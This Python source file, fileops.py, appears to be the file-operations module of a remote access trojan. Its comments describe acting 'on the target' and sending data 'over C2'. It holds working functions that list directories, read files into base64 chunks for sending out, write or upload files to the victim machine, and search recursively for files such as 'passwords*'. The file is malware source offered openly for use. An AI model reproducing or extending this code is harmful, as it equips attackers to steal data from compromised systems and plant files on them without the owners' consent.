# fileops.py — Remote file system operations
# List, download, upload, and search files on the target

import os
import base64
import glob
import time
CHUNK_SIZE = 1024*1024  # 1MB chunks


def list_directory(path: str) -> dict:
    """List directory contents with metadata (size, type, modified time).

    Args:
        path: Directory path to enumerate.

    Returns:
        Dict with status and list of entries.
    """
    try:
        path = os.path.abspath(path)
        entries = []
        for name in sorted(os.listdir(path)):
            full = os.path.join(path, name)
            try:
                stat = os.stat(full)
                entries.append({
                    "name": name,
                    "is_dir": os.path.isdir(full),
                    "size": stat.st_size,
                    "modified": time.strftime(
                        "%Y-%m-%d %H:%M:%S", time.localtime(stat.st_mtime)
                    ),
                })
            except PermissionError:
                entries.append({
                    "name": name, "is_dir": False,
                    "size": -1, "modified": "access denied",
                })
        return {"status": "ok", "path": path, "entries": entries}
    except Exception as e:
        return {"status": "error", "message": str(e)}


def read_file(path: str) -> dict:
    """Read a file in chunks and return base64-encoded data.

    Uses CHUNK_SIZE from config to split large files into
    manageable pieces for transport over C2.

    Args:
        path: File path to read.

    Returns:
        Dict with status, file metadata, and list of base64 chunks.
    """
    try:
        path = os.path.abspath(path)
        file_size = os.path.getsize(path)
        chunks = []
        with open(path, "rb") as f:
            index = 0
            while True:
                data = f.read(CHUNK_SIZE)
                if not data:
                    break
                chunks.append({
                    "index": index,
                    "data": base64.b64encode(data).decode("ascii"),
                    "size": len(data),
                })
                index += 1
        return {
            "status": "ok",
            "path": path,
            "total_size": file_size,
            "total_chunks": len(chunks),
            "chunks": chunks,
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}


def write_file(path: str, b64_data: str) -> dict:
    """Write base64-encoded data to a file on the target.

    Creates parent directories if they don't exist.

    Args:
        path: Destination file path.
        b64_data: Base64-encoded file content.

    Returns:
        Dict with status and bytes written.
    """
    try:
        path = os.path.abspath(path)
        data = base64.b64decode(b64_data)
        parent = os.path.dirname(path)
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(path, "wb") as f:
            f.write(data)
        return {"status": "ok", "path": path, "bytes_written": len(data)}
    except Exception as e:
        return {"status": "error", "message": str(e)}


def download_file(path: str) -> dict:
    """Download a file (read + base64 encode)."""
    try:
        path = os.path.abspath(path)
        if not os.path.exists(path):
            return {"status": "error", "message": f"File not found: {path}"}
        with open(path, "rb") as f:
            data = base64.b64encode(f.read()).decode("ascii")
        return {"status": "ok", "path": path, "data": data}
    except Exception as e:
        return {"status": "error", "message": str(e)}


def upload_file(path: str, b64_data: str) -> dict:
    """Upload a file (decode base64 + write)."""
    try:
        path = os.path.abspath(path)
        data = base64.b64decode(b64_data)
        parent = os.path.dirname(path)
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(path, "wb") as f:
            f.write(data)
        return {"status": "ok", "path": path, "bytes_written": len(data)}
    except Exception as e:
        return {"status": "error", "message": str(e)}


def search_files(root: str, pattern: str) -> dict:
    """Recursively search for files matching a glob pattern.

    Args:
        root: Root directory to search from.
        pattern: Glob pattern (e.g., '*.docx', 'passwords*').

    Returns:
        Dict with status, match count, and list of matching files.
    """
    try:
        root = os.path.abspath(root)
        search_pattern = os.path.join(root, "**", pattern)
        matches = glob.glob(search_pattern, recursive=True)[:100]
        results = []
        for m in matches:
            try:
                stat = os.stat(m)
                results.append({
                    "path": m,
                    "size": stat.st_size,
                    "modified": time.strftime(
                        "%Y-%m-%d %H:%M:%S", time.localtime(stat.st_mtime)
                    ),
                })
            except Exception:
                results.append({"path": m, "size": -1, "modified": "unknown"})
        return {
            "status": "ok",
            "pattern": pattern,
            "matches": len(results),
            "results": results,
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}
